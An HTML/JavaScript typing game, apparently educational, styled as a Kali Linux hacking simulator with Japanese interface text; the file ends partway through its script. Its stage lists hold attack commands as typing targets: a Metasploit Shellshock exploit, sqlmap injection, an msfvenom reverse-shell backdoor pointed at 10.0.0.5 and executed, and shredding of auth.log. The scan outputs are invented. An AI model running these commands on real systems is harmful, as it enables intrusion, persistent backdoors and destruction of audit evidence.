<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>カリLinux VM ハッキングシミュレーター</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --kali-primary: #557cf2;
            --kali-secondary: #0a0a0a;
            --kali-accent: #ff6b6b;
            --kali-terminal: #1e1e1e;
            --kali-text: #f8f8f8;
            --vm-border: #333;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'DejaVu Sans Mono', 'Courier New', monospace;
        }

        body {
            background: linear-gradient(135deg, #111 0%, #222 100%);
            color: var(--kali-text);
            min-height: 100vh;
            overflow-x: hidden;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        /* VMコンテナ */
        .vm-container {
            width: 100%;
            max-width: 1400px;
            background: #111;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 0 30px rgba(0, 0, 0, 0.8);
            border: 1px solid var(--vm-border);
            position: relative;
        }

        /* VMヘッダー */
        .vm-header {
            background: linear-gradient(90deg, #222, #333);
            padding: 10px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid var(--vm-border);
        }

        .vm-title {
            display: flex;
            align-items: center;
            gap: 10px;
            color: #ccc;
            font-size: 14px;
        }

        .vm-title i {
            color: var(--kali-primary);
        }

        .vm-controls {
            display: flex;
            gap: 8px;
        }

        .vm-control-btn {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            cursor: pointer;
        }

        .vm-close { background: #ff5f57; }
        .vm-minimize { background: #ffbd2e; }
        .vm-maximize { background: #28ca42; }

        /* VMメインコンテンツ */
        .vm-content {
            display: flex;
            height: 700px;
        }

        /* 左サイドバー - VMメニュー */
        .vm-sidebar {
            width: 250px;
            background: #1a1a1a;
            border-right: 1px solid var(--vm-border);
            padding: 15px;
            overflow-y: auto;
        }

        .vm-menu-section {
            margin-bottom: 25px;
        }

        .vm-menu-title {
            color: #777;
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 10px;
            padding-bottom: 5px;
            border-bottom: 1px solid #333;
        }

        .vm-menu-item {
            padding: 8px 12px;
            margin-bottom: 5px;
            border-radius: 4px;
            cursor: pointer;
            transition: all 0.2s;
            display: flex;
            align-items: center;
            gap: 10px;
            color: #aaa;
            font-size: 13px;
        }

        .vm-menu-item:hover {
            background: #2a2a2a;
            color: #fff;
        }

        .vm-menu-item.active {
            background: rgba(85, 124, 242, 0.2);
            color: var(--kali-primary);
            border-left: 3px solid var(--kali-primary);
        }

        .vm-menu-icon {
            width: 20px;
            text-align: center;
        }

        /* メインエリア */
        .vm-main {
            flex: 1;
            display: flex;
            flex-direction: column;
            background: #0a0a0a;
        }

        /* VMタブバー */
        .vm-tabs {
            display: flex;
            background: #222;
            border-bottom: 1px solid var(--vm-border);
            padding: 0 10px;
        }

        .vm-tab {
            padding: 10px 20px;
            background: #2a2a2a;
            border: 1px solid transparent;
            border-bottom: none;
            margin-right: 5px;
            cursor: pointer;
            color: #888;
            font-size: 13px;
            display: flex;
            align-items: center;
            gap: 8px;
            border-radius: 4px 4px 0 0;
            transition: all 0.2s;
        }

        .vm-tab.active {
            background: #0a0a0a;
            color: #fff;
            border-color: var(--vm-border);
        }

        .vm-tab-icon {
            color: var(--kali-primary);
        }

        /* ターミナルコンテナ */
        .terminal-container {
            flex: 1;
            padding: 15px;
            position: relative;
        }

        /* コマンドエリア */
        .command-area {
            margin-top: 15px;
            border-top: 1px solid #333;
            padding-top: 15px;
        }

        .command-display {
            background: rgba(20, 20, 20, 0.9);
            border: 1px solid #333;
            border-radius: 4px;
            padding: 12px;
            margin-bottom: 10px;
            font-family: 'DejaVu Sans Mono', monospace;
            font-size: 14px;
            line-height: 1.4;
            min-height: 40px;
            white-space: pre-wrap;
            word-break: break-all;
        }

        .input-container {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .terminal-prompt {
            color: var(--kali-accent);
            font-weight: bold;
            white-space: nowrap;
        }

        #command-input {
            flex: 1;
            background: transparent;
            border: none;
            color: #fff;
            font-family: 'DejaVu Sans Mono', monospace;
            font-size: 14px;
            outline: none;
            padding: 8px 0;
            caret-color: var(--kali-primary);
        }

        /* ネットワークビジュアライゼーション */
        .network-visualization {
            flex: 1;
            background: rgba(10, 10, 20, 0.5);
            border-radius: 4px;
            margin: 15px;
            position: relative;
            overflow: hidden;
            border: 1px solid #333;
        }

        .node {
            position: absolute;
            width: 60px;
            height: 60px;
            border-radius: 8px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            transition: all 0.3s;
            z-index: 2;
        }

        .node-label {
            font-size: 10px;
            margin-top: 5px;
            color: #fff;
        }

        .node-attacker {
            background: linear-gradient(135deg, #ff6b6b, #b33939);
            left: 50px;
            top: 100px;
            box-shadow: 0 0 20px rgba(255, 107, 107, 0.3);
        }

        .node-target {
            background: linear-gradient(135deg, var(--kali-primary), #2d3a8b);
            right: 50px;
            top: 100px;
        }

        .node-router {
            background: linear-gradient(135deg, #4caf50, #2e7d32);
            left: 50%;
            transform: translateX(-50%);
            top: 50px;
        }

        .node-server {
            background: linear-gradient(135deg, #ffa726, #ef6c00);
            left: 50%;
            transform: translateX(-50%);
            bottom: 50px;
        }

        .connection {
            position: absolute;
            height: 2px;
            background: rgba(85, 124, 242, 0.3);
            transform-origin: 0 0;
            z-index: 1;
        }

        .connection-active {
            background: var(--kali-accent);
            box-shadow: 0 0 8px var(--kali-accent);
            animation: pulse 1s infinite;
        }

        /* ツールパネル */
        .tools-panel {
            padding: 15px;
        }

        .tools-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            margin-top: 10px;
        }

        .tool-item {
            background: rgba(40, 40, 60, 0.7);
            border-radius: 6px;
            padding: 12px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s;
            border: 1px solid transparent;
        }

        .tool-item:hover {
            transform: translateY(-2px);
            background: rgba(85, 124, 242, 0.1);
            border-color: var(--kali-primary);
        }

        .tool-item.active {
            background: rgba(85, 124, 242, 0.2);
            border-color: var(--kali-primary);
            box-shadow: 0 0 15px rgba(85, 124, 242, 0.2);
        }

        .tool-icon {
            font-size: 20px;
            color: var(--kali-primary);
            margin-bottom: 8px;
        }

        .tool-name {
            font-size: 11px;
            color: #ccc;
        }

        /* ステータスバー */
        .vm-statusbar {
            background: #222;
            border-top: 1px solid var(--vm-border);
            padding: 8px 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 12px;
            color: #777;
        }

        .status-item {
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .status-value {
            color: #fff;
            font-weight: bold;
        }

        /* ターミナル出力 */
        .terminal-output {
            background: var(--kali-terminal);
            border-radius: 4px;
            padding: 15px;
            height: 400px;
            overflow-y: auto;
            font-family: 'DejaVu Sans Mono', monospace;
            font-size: 13px;
            line-height: 1.4;
            white-space: pre-wrap;
            word-break: break-all;
            border: 1px solid #333;
        }

        .terminal-line {
            margin-bottom: 5px;
        }

        .terminal-command {
            color: #fff;
        }

        .terminal-success {
            color: #4caf50;
        }

        .terminal-error {
            color: #ff5555;
        }

        .terminal-info {
            color: #4ec9b0;
        }

        /* タイピングハイライト */
        .char-correct {
            color: #4caf50;
        }

        .char-incorrect {
            color: #ff5555;
            text-decoration: underline;
        }

        .char-current {
            background-color: rgba(85, 124, 242, 0.3);
            padding: 0 1px;
        }

        /* アニメーション */
        @keyframes pulse {
            0% { opacity: 0.7; }
            50% { opacity: 1; }
            100% { opacity: 0.7; }
        }

        @keyframes scan {
            0% { left: -100%; }
            100% { left: 100%; }
        }

        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }

        /* スクロールバー */
        ::-webkit-scrollbar {
            width: 8px;
        }

        ::-webkit-scrollbar-track {
            background: rgba(30, 30, 46, 0.8);
        }

        ::-webkit-scrollbar-thumb {
            background: var(--kali-primary);
            border-radius: 4px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: var(--kali-accent);
        }

        /* レスポンシブ */
        @media (max-width: 1200px) {
            .vm-content {
                flex-direction: column;
                height: auto;
            }
            
            .vm-sidebar {
                width: 100%;
                height: 200px;
            }
        }

        @media (max-width: 768px) {
            .tools-grid {
                grid-template-columns: repeat(2, 1fr);
            }
            
            .vm-tabs {
                flex-wrap: wrap;
            }
            
            body {
                padding: 10px;
            }
        }
    </style>
</head>
<body>
    <div class="vm-container">
        <!-- VMヘッダー -->
        <div class="vm-header">
            <div class="vm-title">
                <i class="fas fa-desktop"></i>
                <span>Kali Linux VM - Hacking Simulator</span>
            </div>
            <div class="vm-controls">
                <div class="vm-control-btn vm-close"></div>
                <div class="vm-control-btn vm-minimize"></div>
                <div class="vm-control-btn vm-maximize"></div>
            </div>
        </div>

        <div class="vm-content">
            <!-- 左サイドバー -->
            <div class="vm-sidebar">
                <div class="vm-menu-section">
                    <div class="vm-menu-title">ツール</div>
                    <div class="vm-menu-item active" data-tab="terminal">
                        <div class="vm-menu-icon"><i class="fas fa-terminal"></i></div>
                        <span>ターミナル</span>
                    </div>
                    <div class="vm-menu-item" data-tab="network">
                        <div class="vm-menu-icon"><i class="fas fa-network-wired"></i></div>
                        <span>ネットワーク</span>
                    </div>
                    <div class="vm-menu-item" data-tab="tools">
                        <div class="vm-menu-icon"><i class="fas fa-tools"></i></div>
                        <span>ツールキット</span>
                    </div>
                </div>

                <div class="vm-menu-section">
                    <div class="vm-menu-title">攻撃ステージ</div>
                    <div class="vm-menu-item" data-stage="0">
                        <div class="vm-menu-icon"><i class="fas fa-search"></i></div>
                        <span>1. 偵察</span>
                    </div>
                    <div class="vm-menu-item" data-stage="1">
                        <div class="vm-menu-icon"><i class="fas fa-bug"></i></div>
                        <span>2. スキャン</span>
                    </div>
                    <div class="vm-menu-item" data-stage="2">
                        <div class="vm-menu-icon"><i class="fas fa-door-open"></i></div>
                        <span>3. エクスプロイト</span>
                    </div>
                    <div class="vm-menu-item" data-stage="3">
                        <div class="vm-menu-icon"><i class="fas fa-user-shield"></i></div>
                        <span>4. 権限昇格</span>
                    </div>
                    <div class="vm-menu-item" data-stage="4">
                        <div class="vm-menu-icon"><i class="fas fa-flag"></i></div>
                        <span>5. 永続化</span>
                    </div>
                </div>

                <div class="vm-menu-section">
                    <div class="vm-menu-title">システム情報</div>
                    <div class="vm-menu-item">
                        <div class="vm-menu-icon"><i class="fas fa-microchip"></i></div>
                        <span>CPU: Intel i7 4コア</span>
                    </div>
                    <div class="vm-menu-item">
                        <div class="vm-menu-icon"><i class="fas fa-memory"></i></div>
                        <span>RAM: 8GB</span>
                    </div>
                    <div class="vm-menu-item">
                        <div class="vm-menu-icon"><i class="fas fa-hdd"></i></div>
                        <span>ストレージ: 100GB</span>
                    </div>
                    <div class="vm-menu-item">
                        <div class="vm-menu-icon"><i class="fas fa-network-wired"></i></div>
                        <span>ネットワーク: NAT</span>
                    </div>
                </div>
            </div>

            <!-- メインエリア -->
            <div class="vm-main">
                <!-- タブバー -->
                <div class="vm-tabs">
                    <div class="vm-tab active" data-tab="terminal">
                        <i class="fas fa-terminal vm-tab-icon"></i>
                        <span>ターミナル</span>
                    </div>
                    <div class="vm-tab" data-tab="network">
                        <i class="fas fa-network-wired vm-tab-icon"></i>
                        <span>ネットワークマップ</span>
                    </div>
                    <div class="vm-tab" data-tab="tools">
                        <i class="fas fa-tools vm-tab-icon"></i>
                        <span>ツール</span>
                    </div>
                </div>

                <!-- ターミナルタブ -->
                <div class="terminal-container" id="terminal-tab">
                    <div class="terminal-output" id="terminal-output">
                        <div class="terminal-line">
                            <span class="terminal-prompt">root@kali-vm:~#</span>
                            <span class="terminal-command">welcome</span>
                        </div>
                        <div class="terminal-line terminal-info">
                            ========================================
                            Kali Linux VM Hacking Simulator
                            ========================================
                            教育用ハッキングシミュレーター
                            以下のコマンドを入力して攻撃を開始してください
                        </div>
                        <div class="terminal-line terminal-info">
                            最初のコマンド: <strong>nmap -sV -O 192.168.1.1/24</strong>
                        </div>
                    </div>

                    <div class="command-area">
                        <div class="command-display" id="command-display">
                            <div id="command-to-type">nmap -sV -O 192.168.1.1/24</div>
                        </div>
                        <div class="input-container">
                            <span class="terminal-prompt">root@kali-vm:~#</span>
                            <input type="text" id="command-input" autocomplete="off" autofocus>
                        </div>
                    </div>
                </div>

                <!-- ネットワークタブ -->
                <div class="terminal-container" id="network-tab" style="display: none;">
                    <div class="network-visualization" id="network-visualization">
                        <!-- ネットワークノードはJavaScriptで追加 -->
                    </div>
                    <div class="command-area">
                        <div class="terminal-info" style="padding: 10px; font-size: 12px;">
                            <i class="fas fa-info-circle"></i>
                            ネットワークマップ: 攻撃フローに応じて接続がアクティブ化されます
                        </div>
                    </div>
                </div>

                <!-- ツールタブ -->
                <div class="tools-panel" id="tools-tab" style="display: none;">
                    <div class="terminal-info" style="margin-bottom: 15px;">
                        <i class="fas fa-tools"></i>
                        カリLinuxツールキット - ツールをクリックして選択
                    </div>
                    <div class="tools-grid" id="tools-grid">
                        <!-- ツールはJavaScriptで動的に追加 -->
                    </div>
                </div>
            </div>
        </div>

        <!-- ステータスバー -->
        <div class="vm-statusbar">
            <div class="status-item">
                <i class="fas fa-user-secret"></i>
                <span>ユーザー:</span>
                <span class="status-value">root</span>
            </div>
            <div class="status-item">
                <i class="fas fa-tachometer-alt"></i>
                <span>正確率:</span>
                <span class="status-value" id="accuracy">100%</span>
            </div>
            <div class="status-item">
                <i class="fas fa-keyboard"></i>
                <span>WPM:</span>
                <span class="status-value" id="wpm">0</span>
            </div>
            <div class="status-item">
                <i class="fas fa-layer-group"></i>
                <span>ステージ:</span>
                <span class="status-value" id="stage">1/5</span>
            </div>
            <div class="status-item">
                <i class="fas fa-clock"></i>
                <span id="current-time">00:00:00</span>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            console.log("Kali Linux VM シミュレーターを初期化...");
            
            // ゲーム状態
            const gameState = {
                currentStage: 0,
                currentCommand: 0,
                commandsTyped: 0,
                correctCommands: 0,
                startTime: Date.now(),
                activeTool: 'nmap',
                activeTab: 'terminal',
                networkConnections: [],
                tools: [
                    { id: 'nmap', name: 'Nmap', icon: 'fa-search', desc: 'ネットワークスキャナー' },
                    { id: 'metasploit', name: 'Metasploit', icon: 'fa-bomb', desc: 'エクスプロイトフレームワーク' },
                    { id: 'aircrack', name: 'Aircrack-ng', icon: 'fa-wifi', desc: 'WiFiクラッキング' },
                    { id: 'hydra', name: 'Hydra', icon: 'fa-key', desc: 'パスワードクラッキング' },
                    { id: 'sqlmap', name: 'SQLmap', icon: 'fa-database', desc: 'SQLインジェクション' },
                    { id: 'john', name: 'John', icon: 'fa-user-lock', desc: 'パスワードクラッキング' },
                    { id: 'wireshark', name: 'Wireshark', icon: 'fa-eye', desc: 'パケット解析' },
                    { id: 'burpsuite', name: 'Burp Suite', icon: 'fa-bug', desc: 'Web脆弱性スキャナー' },
                    { id: 'nikto', name: 'Nikto', icon: 'fa-shield-alt', desc: 'Webサーバースキャナー' },
                    { id: 'skipfish', name: 'Skipfish', icon: 'fa-fish', desc: 'Webアプリスキャナー' },
                    { id: 'maltego', name: 'Maltego', icon: 'fa-sitemap', desc: 'OSINTツール' },
                    { id: 'ettercap', name: 'Ettercap', icon: 'fa-user-ninja', desc: 'MITM攻撃' }
                ],
                stages: [
                    {
                        name: "偵察と情報収集",
                        desc: "ターゲットの情報収集とマッピング",
                        commands: [
                            "nmap -sV -O 192.168.1.1/24",
                            "maltego --target=example.com",
                            "theharvester -d example.com -l 100 -b all"
                        ]
                    },
                    {
                        name: "脆弱性スキャン",
                        desc: "システムの脆弱性を特定",
                        commands: [
                            "nikto -h http://192.168.1.100",
                            "nessus --target 192.168.1.100",
                            "openvas --scan 192.168.1.100"
                        ]
                    },
                    {
                        name: "エクスプロイト",
                        desc: "脆弱性を利用してアクセスを取得",
                        commands: [
                            "msfconsole -q -x 'use exploit/multi/http/apache_mod_cgi_bash_env_exec; set RHOSTS 192.168.1.100; exploit'",
                            "sqlmap -u 'http://192.168.1.100/login.php' --data='username=admin&password=pass' --dbs"
                        ]
                    },
                    {
                        name: "権限昇格",
                        desc: "管理者権限の取得",
                        commands: [
                            "searchsploit linux kernel 5.4",
                            "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
                            "find / -perm -4000 -type f 2>/dev/null"
                        ]
                    },
                    {
                        name: "永続化と痕跡消去",
                        desc: "アクセスの維持と痕跡の消去",
                        commands: [
                            "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f elf > backdoor.elf",
                            "chmod +x backdoor.elf && ./backdoor.elf",
                            "shred -z -u /var/log/auth.log"
                        ]
                    }
                ]
            };

            // DOM要素
            const terminalOutput = document.getElementById('terminal-output');
            const commandToType = document.getElementById('command-to-type');
            const commandInput = document.getElementById('command-input');
            const toolsGrid = document.getElementById('tools-grid');
            const networkVisualization = document.getElementById('network-visualization');
            const accuracyElement = document.getElementById('accuracy');
            const wpmElement = document.getElementById('wpm');
            const stageElement = document.getElementById('stage');
            const currentTimeElement = document.getElementById('current-time');

            // タブ要素
            const tabs = {
                terminal: document.getElementById('terminal-tab'),
                network: document.getElementById('network-tab'),
                tools: document.getElementById('tools-tab')
            };

            // ゲームの初期化
            function initGame() {
                console.log("VMインターフェースを初期化...");
                
                // ツールグリッドの初期化
                initToolsGrid();
                
                // ネットワークマップの初期化
                initNetworkMap();
                
                // タブ切り替えの設定
                initTabSwitching();
                
                // サイドバーメニューの設定
                initSidebarMenu();
                
                // VMコントロールボタンの設定
                initVMControls();
                
                // コマンド表示の更新
                updateCommandDisplay();
                
                // 入力イベントの設定
                setupInputEvents();
                
                // 時間表示の更新
                updateTime();
                setInterval(updateTime, 1000);
                
                console.log("初期化完了。現在のコマンド:", getCurrentCommand());
            }

            // ツールグリッドの初期化
            function initToolsGrid() {
                toolsGrid.innerHTML = '';
                gameState.tools.forEach(tool => {
                    const toolElement = document.createElement('div');
                    toolElement.className = `tool-item ${tool.id === gameState.activeTool ? 'active' : ''}`;
                    toolElement.dataset.tool = tool.id;
                    toolElement.innerHTML = `
                        <i class="fas ${tool.icon} tool-icon"></i>
                        <div class="tool-name">${tool.name}</div>
                    `;
                    toolElement.addEventListener('click', () => selectTool(tool.id));
                    toolsGrid.appendChild(toolElement);
                });
            }

            // ツールの選択
            function selectTool(toolId) {
                console.log("ツールを選択:", toolId);
                gameState.activeTool = toolId;
                
                // アクティブなツールのハイライト
                document.querySelectorAll('.tool-item').forEach(item => {
                    item.classList.remove('active');
                    if (item.dataset.tool === toolId) {
                        item.classList.add('active');
                    }
                });
                
                // ターミナルに表示
                addTerminalMessage("root@kali-vm:~#", `ツール選択: ${toolId}`, "terminal-command");
            }

            // ネットワークマップの初期化
            function initNetworkMap() {
                networkVisualization.innerHTML = '';
                
                // ネットワークノードの作成
                const nodes = [
                    { id: 'attacker', type: 'attacker', x: 50, y: 100, label: '攻撃者' },
                    { id: 'router', type: 'router', x: '50%', y: 50, label: 'ルーター' },
                    { id: 'server', type: 'server', x: '50%', y: 150, label: 'Webサーバー' },
                    { id: 'target', type: 'target', x: 'calc(100% - 50px)', y: 100, label: 'ターゲット' }
                ];
                
                nodes.forEach(node => {
                    const nodeElement = document.createElement('div');
                    nodeElement.id = `node-${node.id}`;
                    nodeElement.className = `node node-${node.type}`;
                    nodeElement.style.left = node.x;
                    nodeElement.style.top = node.y;
                    nodeElement.innerHTML = `
                        <i class="fas fa-${getNodeIcon(node.type)}"></i>
                        <div class="node-label">${node.label}</div>
                    `;
                    nodeElement.title = node.label;
                    networkVisualization.appendChild(nodeElement);
                });
                
                // 接続の作成
                const connections = [
                    { from: 'attacker', to: 'router', active: false },
                    { from: 'router', to: 'server', active: false },
                    { from: 'router', to: 'target', active: false }
                ];
                
                gameState.networkConnections = connections;
                updateConnections();
            }

            // 接続の更新
            function updateConnections() {
                // 既存の接続を削除
                document.querySelectorAll('.connection').forEach(conn => conn.remove());
                
                gameState.networkConnections.forEach(conn => {
                    const fromNode = document.getElementById(`node-${conn.from}`);
                    const toNode = document.getElementById(`node-${conn.to}`);
                    
                    if (fromNode && toNode) {
                        const fromRect = fromNode.getBoundingClientRect();
                        const toRect = toNode.getBoundingClientRect();
                        const mapRect = networkVisualization.getBoundingClientRect();
                        
                        const x1 = fromRect.left - mapRect.left + 30;
                        const y1 = fromRect.top - mapRect.top + 30;
                        const x2 = toRect.left - mapRect.left + 30;
                        const y2 = toRect.top - mapRect.top + 30;
                        
                        const length = Math.sqrt(Math.pow(x2 - x1, 2) + Math.pow(y2 - y1, 2));
                        const angle = Math.atan2(y2 - y1, x2 - x1) * 180 / Math.PI;
                        
                        const connection = document.createElement('div');
                        connection.className = `connection ${conn.active ? 'connection-active' : ''}`;
                        connection.style.width = `${length}px`;
                        connection.style.left = `${x1}px`;
                        connection.style.top = `${y1}px`;
                        connection.style.transform = `rotate(${angle}deg)`;
                        
                        networkVisualization.appendChild(connection);
                    }
                });
            }

            // ノードアイコンの取得
            function getNodeIcon(type) {
                switch(type) {
                    case 'attacker': return 'user-secret';
                    case 'router': return 'router';
                    case 'server': return 'server';
                    case 'target': return 'bullseye';
                    default: return 'desktop';
                }
            }

            // タブ切り替えの設定
            function initTabSwitching() {
                // タブクリックイベント
                document.querySelectorAll('.vm-tab').forEach(tab => {
                    tab.addEventListener('click', function() {
                        const tabId = this.dataset.tab;
                        switchTab(tabId);
                    });
                });
                
                // サイドバーメニュークリックイベント
                document.querySelectorAll('.vm-menu-item[data-tab]').forEach(menuItem => {
                    menuItem.addEventListener('click', function() {
                        const tabId = this.dataset.tab;
                        switchTab(tabId);
                    });
                });
            }

            // タブ切り替え
            function switchTab(tabId) {
                console.log("タブを切り替え:", tabId);
                gameState.activeTab = tabId;
                
                // すべてのタブを非表示
                Object.values(tabs).forEach(tab => {
                    tab.style.display = 'none';
                });
                
                // 選択したタブを表示
                if (tabs[tabId]) {
                    tabs[tabId].style.display = 'flex' || 'block';
                }
                
                // タブのアクティブ状態を更新
                document.querySelectorAll('.vm-tab').forEach(tab => {
                    tab.classList.remove('active');
                    if (tab.dataset.tab === tabId) {
                        tab.classList.add('active');
                    }
                });
                
                // サイドバーメニューのアクティブ状態を更新
                document.querySelectorAll('.vm-menu-item[data-tab]').forEach(menuItem => {
                    menuItem.classList.remove('active');
                    if (menuItem.dataset.tab === tabId) {
                        menuItem.classList.add('active');
                    }
                });
            }

            // サイドバーメニューの初期化
            function initSidebarMenu() {
                // ステージメニュークリックイベント
                document.querySelectorAll('.vm-menu-item[data-stage]').forEach(menuItem => {
                    menuItem.addEventListener('click', function() {
                        const stageIndex = parseInt(this.dataset.stage);
                        // ステージ切り替え機能（実装予定）
                        console.log("ステージ選択:", stageIndex);
                    });
                });
            }

            // VMコントロールボタンの設定
            function initVMControls() {
                // 閉じるボタン
                document.querySelector('.vm-close').addEventListener('click', function() {
                    if (confirm('VMを終了しますか？')) {
                        document.body.innerHTML = '<div style="text-align:center;padding:50px;color:#fff;background:#000;">VMが終了しました。ページを更新してください。</div>';
                    }
                });
                
                // 最小化ボタン
                document.querySelector('.vm-minimize').addEventListener('click', function() {
                    alert('最小化機能はデモでは利用できません');
                });
                
                // 最大化ボタン
                document.querySelector('.vm-maximize').addEventListener('click', function() {
                    const container = document.querySelector('.vm-container');
                    if (container.style.width === '100%') {
                        container.style.width = '';
                        container.style.height = '';
                    } else {
                        container.style.width = '100%';
                        container.style.height = '100vh';
                    }
                });
            }

            // 入力イベントの設定 - 修正版
            function setupInputEvents() {
                console.log("入力イベントを設定...");
                
                // 入力時のハイライト
                commandInput.addEventListener('input', handleCommandInput);
                
                // Enterキーでの送信 - 修正
                                commandInput.addEventListener('keydown', function(e) {
                    console.log("キー押下:", e.key);
                    if (e.key === 'Enter') {
                        e.preventDefault();
                        console.log("Enterキーを検出、コマンドをチェックします");
                        checkCommand();
                        return false;
                    }
                });
                
                // 入力フィールドをフォーカス
                commandInput.focus();
                
                console.log("入力イベントの設定完了");
            }

            // 現在のコマンドを取得
            function getCurrentCommand() {
                if (gameState.currentStage >= gameState.stages.length) {
                    return "ゲーム終了";
                }
                if (gameState.currentCommand >= gameState.stages[gameState.currentStage].commands.length) {
                    return "ステージ完了";
                }
                return gameState.stages[gameState.currentStage].commands[gameState.currentCommand];
            }

            // コマンド入力の処理
            function handleCommandInput() {
                const currentCommand = getCurrentCommand();
                const input = commandInput.value;
                
                console.log("入力処理:", {
                    currentCommand: currentCommand,
                    input: input,
                    inputLength: input.length,
                    commandLength: currentCommand.length
                });
                
                let highlighted = '';
                for (let i = 0; i < currentCommand.length; i++) {
                    let charClass = '';
                    if (i < input.length) {
                        charClass = input[i] === currentCommand[i] ? 'char-correct' : 'char-incorrect';
                    } else if (i === input.length) {
                        charClass = 'char-current';
                    }
                    highlighted += `<span class="${charClass}">${currentCommand[i]}</span>`;
                }
                
                commandToType.innerHTML = highlighted;
            }

            // コマンドのチェック - 修正版
            function checkCommand() {
                console.log("コマンドをチェック中...");
                
                const currentStage = gameState.stages[gameState.currentStage];
                const currentCommandText = currentStage.commands[gameState.currentCommand];
                const input = commandInput.value;
                
                console.log("比較:", {
                    expected: currentCommandText,
                    actual: input,
                    match: input === currentCommandText
                });
                
                // コンソールに入力を表示
                addTerminalMessage("root@kali-vm:~#", input, "terminal-command");
                
                if (input === currentCommandText) {
                    console.log("コマンドが正しいです");
                    gameState.correctCommands++;
                    
                    // コマンド出力を表示
                    const output = getCommandOutput(currentCommandText);
                    addTerminalMessage("", output, "terminal-success");
                    
                    // ネットワーク接続をアクティブ化
                    activateNetworkConnection();
                    
                    // 統計を更新
                    updateStats();
                    
                    // 次のコマンドへ
                    gameState.currentCommand++;
                    gameState.commandsTyped++;
                    
                    console.log("次のコマンドへ:", {
                        stage: gameState.currentStage,
                        command: gameState.currentCommand,
                        totalCommands: currentStage.commands.length
                    });
                    
                    if (gameState.currentCommand >= currentStage.commands.length) {
                        // ステージ完了
                        console.log("ステージ完了:", gameState.currentStage);
                        completeCurrentStage();
                    } else {
                        updateCommandDisplay();
                    }
                } else {
                    console.log("コマンドが間違っています");
                    addTerminalMessage("", "エラー: コマンドが正しくありません。再試行してください。", "terminal-error");
                    gameState.commandsTyped++;
                    updateStats();
                    
                    // 入力フィールドをリセットしてフォーカス
                    commandInput.value = '';
                    setTimeout(() => {
                        handleCommandInput(); // ハイライトをリセット
                        commandInput.focus();
                    }, 10);
                    return;
                }
                
                // 入力フィールドをクリアしてフォーカス
                commandInput.value = '';
                setTimeout(() => {
                    commandInput.focus();
                    handleCommandInput();
                }, 10);
            }

            // コマンドの出力を生成
            function getCommandOutput(command) {
                const outputs = {
                    "nmap -sV -O 192.168.1.1/24": 
`Nmap scan report for 192.168.1.1
Host is up (0.023s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.9p1
80/tcp   open  http        Apache httpd 2.4.38
443/tcp  open  ssl/https   Apache httpd 2.4.38
MAC Address: 00:1A:2B:3C:4D:5E (Router Manufacturer)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6

[+] ネットワークスキャン完了
[+] 3つのオープンポートを発見
[+] ターゲットOS: Linux 4.15-5.6`,

                    "maltego --target=example.com":
`[+] Maltego Transform Discovery
[+] Domain: example.com
[+] IP Addresses: 192.168.1.100, 192.168.1.101
[+] Nameservers: ns1.example.com, ns2.example.com
[+] MX Records: mail.example.com
[+] Subdomains: www, mail, admin, test, dev
[+] Technologies: Apache 2.4.38, PHP 7.4, WordPress 5.8
[+] Email Addresses: admin@example.com, webmaster@example.com

[+] 情報収集完了
[+] 5つのサブドメインを発見
[+] WordPressサイトを特定`,

                    "theharvester -d example.com -l 100 -b all":
`[*] Target: example.com
[*] Searching in Google...
[*] Searching in Bing...
[*] Searching in LinkedIn...
[*] Searching in Twitter...

[+] Emails found: 
admin@example.com
webmaster@example.com
support@example.com
info@example.com

[+] Hosts found in search engines:
www.example.com
mail.example.com
admin.example.com

[+] Virtual hosts:
vpn.example.com
dev.example.com

[+] OSINT収集完了
[+] 4つのメールアドレスを発見
[+] 隠しサブドメインを特定`,

                    "nikto -h http://192.168.1.100":
`- Nikto v2.1.6
- Target IP: 192.168.1.100
- Target Hostname: webserver.local
- Target Port: 80
- Start Time: 2023-10-05 12:00:00

+ Server: Apache/2.4.38 (Debian)
+ Retrieved x-powered-by header: PHP/7.4.3
+ OSVDB-3092: /admin/: This might be interesting...
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3233: /phpinfo.php: Contains PHP configuration information
+ OSVDB-0: /test/: Test page found.

[+] 6544 items checked: 0 error(s) and 6 item(s) reported on remote host
[+] 脆弱性スキャン完了
[+] 6つの潜在的な問題を発見
[+] /admin/ ディレクトリが公開されている`,

                    "nessus --target 192.168.1.100":
`Nessus Scan Report
===================
Target: 192.168.1.100
Scan Start: 2023-10-05 12:05:00
Scan Duration: 2 minutes 34 seconds

Critical Vulnerabilities: 1
High Vulnerabilities: 3
Medium Vulnerabilities: 7
Low Vulnerabilities: 12

[Critical] CVE-2021-44228 - Log4Shell
[High] CVE-2021-41773 - Apache Path Traversal
[High] CVE-2021-40438 - Apache HTTP Server
[High] CVE-2020-14882 - Oracle WebLogic

[+] 脆弱性スキャン完了
[+] 重要な脆弱性を発見
[+] CVE-2021-44228 (Log4Shell) が確認されました`,

